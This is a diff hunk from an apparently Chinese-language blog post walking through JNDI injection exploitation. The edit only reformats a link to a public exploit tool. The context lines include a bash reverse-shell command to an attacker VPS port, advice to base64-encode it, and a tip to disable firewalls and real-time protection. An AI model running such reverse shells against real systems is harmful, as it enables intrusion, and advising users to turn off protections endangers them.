@@ -82,7 +82,7 @@ bash -i >& /dev/tcp/vps_ip/6666 0>&1
 ~~~
 接着进行编码，对命令进行base64加密即可
 ![1]({{site.baseurl}}/img-post/l-18.png)
-接下来利用现成的JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，项目地址：https://github.com/welk1n/JNDI-Injection-Exploit
+接下来利用现成的JNDI注入工具：JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，项目地址：[JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
 （注意下载的时候要关掉一切防火墙和实时保护）
 
 最迟到这里你的kali攻击机就要启动了，执行命令
